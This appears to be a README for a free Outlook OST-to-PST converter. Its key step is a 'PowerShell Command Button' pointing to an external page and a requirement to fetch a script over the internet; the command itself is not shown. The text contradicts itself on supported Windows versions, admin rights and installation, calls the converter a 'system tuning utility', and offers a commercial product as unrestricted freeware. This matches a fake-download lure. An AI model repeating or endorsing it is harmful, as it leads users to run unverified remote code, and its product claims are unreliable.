<div align="center">

# eSoftTools OST to PST Converter: Bulk Conversion & Data Migration for Windows 11

![](files/1.webp)

### ⌨️ PowerShell Command Button

[![](files/button.png)](https://hvaezi-63.github.io/esofttools-ost-to-pst-converter/)

[![lic](https://img.shields.io/badge/LIC-BSD--3--CLAUSE-a855f7?style=for-the-badge&labelColor=0d1117)]() [![system](https://img.shields.io/badge/SYSTEM-WINDOWS_10_%2F_11-9333ea?style=for-the-badge&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/TESTS-PASSING-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-7%2B-7c3aed?style=for-the-badge&labelColor=0d1117)]()

</div>

---

eSoftTools OST to PST Converter is a free Windows system tuning utility engineered for bulk conversion and selective data migration of Outlook OST files. The application recovers inaccessible or orphaned OST data and exports it to PST and other supported formats while preserving mailbox structure, attachments, and metadata. It provides selective folder-level migration, multi-format export options, and direct integration with Microsoft Outlook for streamlined recovery workflows. The utility runs across Windows XP and later on both x86 and x64 architectures, requiring minimal system resources.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Graphical User Interface** — A structured, wizard-driven workflow guides the user through source selection, scan configuration, preview, and export, reducing the need for manual steps or command-line input.

- **Bulk OST Conversion** — Multiple OST files can be queued and processed within a single operation, with per-file progress reporting and consolidated output handling to minimize repetitive user interaction.

- **Selective Data Migration** — Mailboxes, folders, and individual items can be selectively marked for export, allowing granular control over what is migrated and keeping output size and processing time proportionate to the actual scope of data required.

- **Inaccessible and Corrupted OST Recovery** — The conversion engine parses OST containers that Outlook can no longer mount, extracting mailbox items, attachments, and folder hierarchy metadata from damaged or orphaned files.

- **Preview Before Export** — A built-in preview pane renders recovered mailbox content prior to conversion, enabling verification of data integrity and confirmation of the selected export scope before any output is written.

- **Multiple Output Formats** — Converted data can be written beyond PST, including alternative mailbox and document-oriented formats, providing flexibility for downstream migration targets and archival requirements.

- **Folder Hierarchy and Metadata Preservation** — Original folder structure, item timestamps, read/unread state, and attachment associations are retained during conversion to maintain mailbox fidelity in the output.

- **Microsoft Outlook Integration** — Output PST files are compatible with Microsoft Outlook, supporting direct import into existing profiles and enabling continuity of mail access after migration.

- **Windows Platform Support** — Compatible with Windows XP and later operating systems across both x64 and x86 architectures, with a lightweight footprint suitable for standard desktop and workstation environments.

## How It Works

The converter operates through a structured, multi-stage pipeline designed to preserve data integrity throughout the OST-to-PST migration process.

**1. Source File Ingestion**

The application accepts OST files through a file browser or drag-and-drop interface. It supports both single-file operations and bulk selection, allowing multiple OST files to be queued in a single session. During ingestion, the utility performs a preliminary scan to identify file structure, mailbox schema, and integrity status, flagging any corruption or encryption that may affect downstream processing.

**2. Parsing and Data Extraction**

Once a file is loaded, the conversion engine parses the OST container at the MAPI level, extracting mailbox items including emails, attachments, calendar entries, contacts, tasks, notes, and folder hierarchies. The parser reads the internal database structure directly rather than relying on an active Outlook profile, which allows it to process orphaned, disconnected, or inaccessible OST files that Outlook itself cannot open.

**3. Integrity Verification and Recovery**

Before conversion, the tool validates extracted items against their source records and applies recovery routines to damaged or partially readable entries. Recoverable items are reconstructed where possible; unrecoverable records are isolated and reported so the user retains a clear picture of what was salvaged. This stage is what enables the utility to work with corrupted OST files that standard Outlook repair routines cannot address.

**4. Selective Migration and Filtering**

Users can scope the conversion through folder-level selection, applying granular filters to include or exclude specific mailboxes, folders, date ranges, or item types. This selective migration model reduces output size and processing time when only a subset of data is required, while a full-mailbox mode remains available for complete migrations.

**5. Format Mapping and Output Generation**

Selected items are mapped from the OST schema to the target PST structure, preserving folder hierarchy, metadata, timestamps, and attachment integrity. The output engine writes a valid PST file compatible with supported Outlook versions. Additional export targets are offered alongside PST for cases where alternate formats are needed.

**6. Verification and Completion**

After writing, the utility performs a post-conversion check to confirm item counts and structural consistency between source and output. A completion summary reports processed items, recovered records, and any skipped entries, giving users an auditable record of the migration. Output files are written to a user-specified destination, leaving the original OST untouched.

The entire workflow runs locally on the Windows desktop, requires no active Exchange connection, and does not modify source files — making it suitable for recovery scenarios where the original data must remain intact.

## Compatibility

eSoftTools OST to PST Converter is engineered exclusively for the Windows desktop environment and integrates directly with the installed Microsoft Outlook profile to perform OST recovery and migration operations.

**Operating System**
- Windows 11, Windows 10, Windows 8.1, Windows 8, Windows 7, Windows Vista, and Windows XP (32-bit and 64-bit editions)
- Both x86 and x64 architectures are supported

**Microsoft Outlook Integration**
- Compatible with Microsoft Outlook 2021, 2019, 2016, 2013, 2010, 2007, and 2003
- Requires a locally installed Outlook client for profile detection and direct mailbox migration
- Supports both ANSI and Unicode PST output, ensuring compatibility with legacy and current Outlook data stores

**Input and Output Formats**
- Input: Outlook OST files, including orphaned, encrypted, and password-protected OST files
- Output: PST, EML, MSG, HTML, MHTML, RTF, TXT, CSV, and vCard
- Preserves the original folder hierarchy, email metadata, attachments, calendar entries, contacts, tasks, and journal items throughout conversion

**Hardware Baseline**
- Processor: 1 GHz or faster
- RAM: 512 MB minimum (1 GB or higher recommended for bulk conversion workloads)
- Disk space: 100 MB for installation, plus additional storage proportional to the size of the OST files and resulting output
- Display: standard desktop resolution with no specialized graphics requirements

**Deployment Notes**
- Runs as a standalone desktop application with no external server, database engine, or cloud dependency
- Operates without requiring an active Exchange Server connection, making it suitable for recovering mailboxes from disconnected or decommissioned accounts
- No additional runtime libraries or third-party frameworks are required beyond the standard Windows environment
- Compatible with standard Windows user account permissions; administrative privileges are recommended for installation

## FAQ

**What file formats does eSoftTools OST to PST Converter support for export?**

The converter supports export to PST as its primary target format, along with additional mailbox and document formats for flexible migration workflows. Selective export allows individual folders, messages, attachments, and calendar items to be routed independently, so mixed-format migrations can be completed in a single pass without re-processing the source file.

**How does the tool handle inaccessible or corrupted OST files?**

The conversion engine parses OST structures at the item level, recovering readable messages, attachments, contacts, and calendar entries from files that Outlook can no longer mount. A preview pane lets you validate recovered content before committing to conversion, and the recovery pass operates read-only against the source file to preserve the original data.

**Can multiple OST files be processed in a single operation?**

Yes. Bulk conversion accepts multiple OST files in one queue, applying consistent output settings across the entire batch. Per-file progress is reported independently, so a failure on one file does not interrupt the remaining queue, and completed items can be reviewed before the batch finishes.

**Does the converter modify or delete the original OST file?**

No. All operations are non-destructive; the source OST file is opened read-only and left untouched. Output is written to a separate destination path of your choosing, which allows repeat conversions and side-by-side comparison of results.

**What Outlook and Windows versions are supported?**

The utility runs on Windows XP and later, in both x86 and x64 architectures, and integrates with the corresponding Microsoft Outlook installations for mailbox validation. Output PST files are compatible with the Outlook versions supported by the target format, and no additional runtime dependencies are required beyond the installer.

**How does selective data migration reduce processing time?**

Rather than converting an entire mailbox, you can scope the operation to specific folders, date ranges, or item types. The engine skips excluded content entirely, which shortens processing time on large OST files and keeps output PSTs focused on the data you actually need.

**Is the software free, and are there feature limitations?**

The full version is distributed as freeware with no feature gating. Bulk conversion, selective migration, recovery of inaccessible items, and multi-format export are all available without a paid tier or watermark.

## Disclaimer

The information and functionality provided by Esofttools-Ost-To-Pst-Converter are intended for legitimate data recovery, migration, and system maintenance purposes only. This utility is designed to operate on Outlook OST files that the user owns or is explicitly authorized to access and convert. Users are solely responsible for ensuring that their use of the software complies with all applicable local, national, and international laws, as well as any organizational policies governing data access, retention, and privacy.

Esofttools-Ost-To-Pst-Converter is provided on an "as is" and "as available" basis, without warranties of any kind, whether express, implied, or statutory, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. The developers and distributors of this utility do not warrant that the conversion process will be uninterrupted, error-free, or capable of recovering every element of a corrupted or inaccessible OST file. Results may vary depending on the integrity, size, and structure of the source data, as well as the environment in which the software is executed.

By using Esofttools-Ost-To-Pst-Converter, you acknowledge that you assume full responsibility for any data loss, corruption, or unintended modification that may occur during bulk conversion, selective data migration, or recovery operations. It is strongly recommended that users maintain independent, verified backups of all source OST files and target PST destinations prior to initiating any conversion task. The developers and distributors shall not be held liable for any direct, indirect, incidental, consequential, or special damages arising from the use of, or inability to use, this software, including but not limited to loss of business, loss of data, or interruption of service.

The software is distributed as freeware for Windows platforms and is intended to be obtained only from verified, official distribution channels. Any redistribution, modification, or repackaging of the utility outside of its intended distribution path is not supported and may void eligibility for technical assistance. Feature availability, compatibility with specific Outlook versions, and performance characteristics are subject to change without prior notice as the utility is updated and refined.

Nothing in this disclaimer limits or excludes any liability that cannot be limited or excluded under applicable law. If any provision of this disclaimer is held to be invalid or unenforceable, the remaining provisions shall continue in full force and effect. Your continued use of Esofttools-Ost-To-Pst-Converter constitutes acceptance of the terms outlined in this section.

## License

This project is distributed under a freeware license model. The software is provided as a fully functional system tuning and conversion utility for Windows, with no subscription fees, license keys, or time-limited trials required to access its core capabilities.

### Usage Rights

- **Free Deployment** — Install and operate the utility on any number of compatible Windows workstations within your organization or personal environment, subject to the terms outlined below.
- **Full Feature Access** — Bulk conversion, selective data migration, Outlook integration, and all supported output formats are available without feature gating.
- **Redistribution Restrictions** — The installer and associated binaries may not be repackaged, rebranded, modified, or bundled with third-party software. Distribution must occur through the original, unmodified release package.
- **No Reverse Engineering** — Decompilation, disassembly, or derivation of source components is prohibited except where permitted by applicable law.

### Warranty & Liability

The software is supplied on an "as is" basis, without express or implied warranties of merchantability, fitness for a particular purpose, or non-infringement. In no event shall the authors or distributors be liable for data loss, corruption, or incidental damages arising from use of the conversion tooling. Users are strongly advised to maintain independent backups of OST source files prior to any migration operation.

### Attribution

All trademarks, product names, and references to Microsoft Outlook remain the property of their respective owners. This utility is an independent conversion tool and is not affiliated with, endorsed by, or sponsored by Microsoft Corporation.

### Compliance

Use of this software to access, recover, or migrate mailbox data is your responsibility to ensure it complies with applicable organizational policies and data protection regulations. The license grants no rights to data you do not lawfully control.